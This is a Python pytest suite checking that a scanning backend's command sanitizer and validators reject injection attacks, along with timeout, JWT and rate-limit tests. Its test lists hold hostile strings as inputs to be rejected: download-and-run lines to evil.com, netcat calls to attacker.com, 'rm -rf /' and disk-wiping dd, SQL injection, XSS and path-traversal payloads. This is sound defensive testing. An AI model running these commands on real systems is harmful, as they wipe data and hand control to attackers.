"""
Comprehensive Security Test Suite

Implements security test cases from QA_COMPREHENSIVE_ANALYSIS.md
Tests for Issues #1-#10, #106-#120 (security vulnerabilities)

Author: QA Security Team  
Date: 2025-10-30
Purpose: Comprehensive security testing addressing all QA security issues
"""

import pytest
import sys
import subprocess
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock

# Add backend to path
backend_dir = Path(__file__).parent.parent
sys.path.insert(0, str(backend_dir))

from utils.wsl_helper import WSLHelper
from utils.input_validation import (
    IPAddressValidator, PortValidator, CommandSanitizer, WSLCommandValidator,
    ValidationError
)


class TestCommandInjectionPrevention:
    """Test Case #1, #4, #106-#107: Command Injection Prevention"""
    
    def test_rejects_semicolon_injection(self):
        """QA Issue #1: Reject semicolon command chaining"""
        helper = WSLHelper()
        
        malicious_commands = [
            "nmap 192.168.1.1; rm -rf /",
            "nmap target; shutdown now",
            "scan; wget http://evil.com/malware.sh | bash",
        ]
        
        for cmd in malicious_commands:
            with pytest.raises(ValueError, match="dangerous"):
                helper._sanitize_command(cmd)
    
    def test_rejects_ampersand_injection(self):
        """QA Issue #1: Reject ampersand command chaining"""
        helper = WSLHelper()
        
        malicious_commands = [
            "nmap target && rm -rf /",
            "scan && curl http://evil.com | bash",
        ]
        
        for cmd in malicious_commands:
            with pytest.raises(ValueError, match="dangerous"):
                helper._sanitize_command(cmd)
    
    def test_rejects_pipe_injection(self):
        """QA Issue #1: Reject pipe command injection"""
        helper = WSLHelper()
        
        malicious_commands = [
            "nmap target | rm -rf /",
            "scan | nc attacker.com 4444",
        ]
        
        for cmd in malicious_commands:
            with pytest.raises(ValueError, match="dangerous"):
                helper._sanitize_command(cmd)
    
    def test_rejects_backtick_substitution(self):
        """QA Issue #1: Reject backtick command substitution"""
        helper = WSLHelper()
        
        malicious_commands = [
            "nmap `whoami`",
            "scan target `curl http://evil.com/cmd`",
        ]
        
        for cmd in malicious_commands:
            with pytest.raises(ValueError, match="dangerous"):
                helper._sanitize_command(cmd)
    
    def test_rejects_dollar_substitution(self):
        """QA Issue #1: Reject $() command substitution"""
        helper = WSLHelper()
        
        malicious_commands = [
            "nmap $(whoami)",
            "scan $(curl http://evil.com/cmd)",
        ]
        
        for cmd in malicious_commands:
            with pytest.raises(ValueError, match="dangerous"):
                helper._sanitize_command(cmd)
    
    def test_rejects_redirect_to_devices(self):
        """QA Issue #1: Reject redirect to device files"""
        helper = WSLHelper()
        
        malicious_commands = [
            "echo malicious > /dev/sda",
            "dd if=/dev/zero of=/dev/sda",
        ]
        
        for cmd in malicious_commands:
            with pytest.raises(ValueError, match="dangerous"):
                helper._sanitize_command(cmd)
    
    def test_accepts_safe_nmap_commands(self):
        """QA Issue #1: Allow legitimate scan commands"""
        helper = WSLHelper()
        
        safe_commands = [
            "nmap -sV 192.168.1.1",
            "nmap -p 80,443 scanme.nmap.org",
            "nmap -A 10.0.0.0/24",
        ]
        
        for cmd in safe_commands:
            # Should not raise exception
            result = helper._sanitize_command(cmd)
            assert result == cmd


class TestProcessTimeoutHandling:
    """Test Case #2, #160, #185: Process timeout and zombie prevention"""
    
    @patch('utils.wsl_helper.WSLHelper._validate_wsl_available')
    @patch('subprocess.Popen')
    def test_timeout_kills_process(self, mock_popen, mock_validate):
        """QA Issue #2: Ensure timeout terminates process"""
        # Mock WSL validation to pass
        mock_validate.return_value = None
        
        # Setup mock process that times out
        mock_process = Mock()
        mock_process.communicate.side_effect = subprocess.TimeoutExpired(['test'], 1)
        mock_process.poll.return_value = None  # Still running
        mock_popen.return_value = mock_process
        
        helper = WSLHelper()
        
        with pytest.raises(subprocess.TimeoutExpired):
            helper.execute_command("sleep 1000", timeout=1)
        
        # Verify termination attempted
        mock_process.terminate.assert_called_once()
    
    @patch('utils.wsl_helper.WSLHelper._validate_wsl_available')
    @patch('subprocess.Popen')
    def test_force_kill_if_terminate_fails(self, mock_popen, mock_validate):
        """QA Issue #2: Force kill if graceful termination fails"""
        # Mock WSL validation to pass
        mock_validate.return_value = None
        
        # Setup mock process that doesn't terminate gracefully
        mock_process = Mock()
        mock_process.communicate.side_effect = subprocess.TimeoutExpired(['test'], 1)
        mock_process.wait.side_effect = subprocess.TimeoutExpired(['test'], 5)
        mock_process.poll.return_value = None
        mock_popen.return_value = mock_process
        
        helper = WSLHelper()
        
        with pytest.raises(subprocess.TimeoutExpired):
            helper.execute_command("stubborn_process", timeout=1)
        
        # Verify force kill attempted (may be called multiple times in cleanup)
        assert mock_process.kill.called, "Process should have been force killed"
    
    @patch('utils.wsl_helper.WSLHelper._validate_wsl_available')
    @patch('subprocess.Popen')
    def test_cleanup_in_finally_block(self, mock_popen, mock_validate):
        """QA Issue #2: Ensure process cleanup even on exception"""
        # Mock WSL validation to pass
        mock_validate.return_value = None
        
        # Setup mock process that raises unexpected error
        mock_process = Mock()
        mock_process.communicate.side_effect = RuntimeError("Unexpected error")
        mock_process.poll.return_value = None  # Still running
        mock_popen.return_value = mock_process
        
        helper = WSLHelper()
        
        with pytest.raises(RuntimeError):
            helper.execute_command("error_command", timeout=10)
        
        # Verify cleanup attempted despite error
        mock_process.kill.assert_called()


class TestWSLDistributionValidation:
    """Test Case #3, #78: WSL distribution availability checking"""
    
    @patch('subprocess.run')
    def test_validates_wsl_installed(self, mock_run):
        """QA Issue #3: Check WSL is installed"""
        # Simulate WSL not found
        mock_run.side_effect = FileNotFoundError()
        
        with pytest.raises(RuntimeError, match="not installed"):
            WSLHelper()
    
    @patch('subprocess.run')
    def test_validates_distribution_exists(self, mock_run):
        """QA Issue #3: Check distribution exists"""
        # Simulate Kali not installed
        mock_run.return_value = Mock(
            returncode=0,
            stdout="NAME\nUbuntu\nDebian\n"
        )
        
        with pytest.raises(RuntimeError, match="not found"):
            WSLHelper(distribution="kali-linux")
    
    @patch('subprocess.run')
    def test_starts_stopped_distribution(self, mock_run):
        """QA Issue #3: Start distribution if stopped"""
        # First call: list distributions (Kali stopped)
        # Second call: start distribution
        mock_run.side_effect = [
            Mock(returncode=0, stdout="NAME    STATE\nkali-linux Stopped\n"),
            Mock(returncode=0, stdout="test\n")  # Echo test
        ]
        
        # Should not raise exception
        helper = WSLHelper(distribution="kali-linux")
        assert helper.distribution == "kali-linux"
    
    @patch('subprocess.run')
    def test_timeout_on_unresponsive_wsl(self, mock_run):
        """QA Issue #3: Handle unresponsive WSL"""
        # Simulate WSL timeout
        mock_run.side_effect = subprocess.TimeoutExpired(['wsl.exe'], 10)
        
        with pytest.raises(RuntimeError, match="timed out"):
            WSLHelper()


class TestInputValidation:
    """Test Cases #106-#110: Input validation and sanitization"""
    
    def test_sql_injection_in_filter_params(self):
        """Test Case #106: Prevent SQL injection in query parameters"""
        from api_gateway.app import create_app
        
        app = create_app('testing')
        client = app.test_client()
        
        # Try SQL injection in filter parameter
        response = client.get("/api/scans/?status=completed' OR '1'='1")
        
        # Should either reject or safely handle
        assert response.status_code in [200, 400]
        if response.status_code == 200:
            data = response.get_json()
            # Should not return all scans (SQL injection failed)
            assert isinstance(data, dict)
    
    def test_command_injection_in_target(self):
        """Test Case #107: Prevent command injection via scan target"""
        malicious_targets = [
            "192.168.1.1; rm -rf /",
            "target && whoami",
            "target | nc attacker.com 4444",
        ]
        
        for target in malicious_targets:
            with pytest.raises(ValidationError):  # Should raise validation error
                IPAddressValidator.validate_ip(target)
    
    def test_xss_in_vulnerability_description(self):
        """Test Case #108: Prevent XSS in displayed content"""
        # This would be tested in frontend, but backend should sanitize
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
        ]
        
        # Basic sanitization check (implementation to be added)
        import html
        
        for payload in xss_payloads:
            # Should escape HTML entities
            sanitized = html.escape(payload)
            assert '&lt;script&gt;' in sanitized or '<script>' not in sanitized
            assert '&lt;img' in sanitized or '<img' not in sanitized
    
    def test_path_traversal_in_export(self):
        """Test Case #109: Prevent path traversal in file operations"""
        import os
        
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
        ]
        
        # Basic path validation
        def is_safe_path(path, allowed_dir="/tmp/reports"):
            # Normalize and check if path escapes allowed directory
            normalized = os.path.normpath(os.path.join(allowed_dir, path))
            return normalized.startswith(allowed_dir)
        
        for path in malicious_paths:
            assert not is_safe_path(path), f"Path traversal not prevented: {path}"


class TestDataSecurity:
    """Test Cases #111-#115: Data security and encryption"""
    
    def test_database_connection_uses_ssl(self):
        """Test Case #111: Verify database connections use SSL"""
        from config.config import get_config
        
        config = get_config('production')
        db_url = config.DATABASE_URL
        
        # In production, should use SSL
        if config.ENV == 'production':
            assert 'sslmode=' in db_url or 'ssl=true' in db_url
    
    def test_secrets_not_in_environment(self):
        """Test Case #113: Verify secrets not hardcoded"""
        import os
        
        # Check that critical secrets are from environment
        from config.config import get_config
        config = get_config('production')
        
        # JWT secret should not be default in production
        if config.ENV == 'production':
            assert config.JWT_SECRET_KEY != "dev-jwt-secret-CHANGE-IN-PRODUCTION"
    
    def test_error_messages_no_sensitive_data(self):
        """Test Case #114: Errors don't leak sensitive info"""
        from api_gateway.app import create_app
        
        app = create_app('production')
        app.config['DEBUG'] = False
        client = app.test_client()
        
        # Trigger error
        response = client.get("/api/nonexistent-endpoint")
        
        error_text = response.get_data(as_text=True)
        
        # Should not contain sensitive paths or stack traces
        assert '/backend/' not in error_text
        assert 'Traceback' not in error_text
        assert 'File "' not in error_text


class TestRateLimiting:
    """Test Case #60, Issue #9: Rate limiting and abuse prevention"""
    
    def test_login_rate_limit_enforced(self):
        """QA Issue #9: Login endpoint rate limited"""
        from api_gateway.app import create_app
        
        app = create_app('testing')
        client = app.test_client()
        
        # Make 6 login requests (limit is 5 per minute)
        for i in range(6):
            response = client.post('/api/auth/login', json={
                'username': 'test',
                'password': 'test123'
            })
            
            if i < 5:
                assert response.status_code in [200, 401]
            else:
                # 6th request should be rate limited
                assert response.status_code == 429
    
    def test_api_rate_limit_headers_present(self):
        """QA Issue #9: Rate limit headers in responses"""
        from api_gateway.app import create_app
        
        app = create_app('testing')
        client = app.test_client()
        
        response = client.get('/api/scans/')
        
        # Should include rate limit headers
        assert 'X-RateLimit-Limit' in response.headers or 'RateLimit-Limit' in response.headers


class TestJWTSecurity:
    """Test Cases #101-#105, Issue #10: JWT token security"""
    
    def test_tokens_in_httponly_cookies(self):
        """QA Issue #10: Tokens stored in HttpOnly cookies"""
        from api_gateway.app import create_app
        
        app = create_app('testing')
        client = app.test_client()
        
        response = client.post('/api/auth/login', json={
            'username': 'testuser',
            'password': 'testpass123'
        })
        
        if response.status_code == 200:
            # Check cookies
            cookies = response.headers.getlist('Set-Cookie')
            access_cookie = next((c for c in cookies if 'access_token' in c), None)
            
            assert access_cookie is not None
            assert 'HttpOnly' in access_cookie
            assert 'SameSite' in access_cookie
    
    def test_expired_token_rejected(self):
        """Test Case #101: Expired JWT tokens rejected"""
        from utils.jwt_handler import JWTHandler
        from datetime import timedelta
        import time
        
        handler = JWTHandler(secret_key="test-secret")
        
        # Generate token with very short expiry (mock by manipulating exp claim)
        access_token, _ = handler.generate_tokens("user123", {})
        
        # Create an expired token by manually encoding with past exp time
        import jwt
        from datetime import datetime, timezone
        
        payload = {
            'user_id': 'user123',
            'exp': datetime.now(timezone.utc) - timedelta(seconds=10),  # Already expired
            'iat': datetime.now(timezone.utc) - timedelta(seconds=20)
        }
        
        expired_token = jwt.encode(payload, "test-secret", algorithm='HS256')
        
        # Should reject expired token
        with pytest.raises(Exception):
            handler.verify_token(expired_token)


# Run tests if executed directly
if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
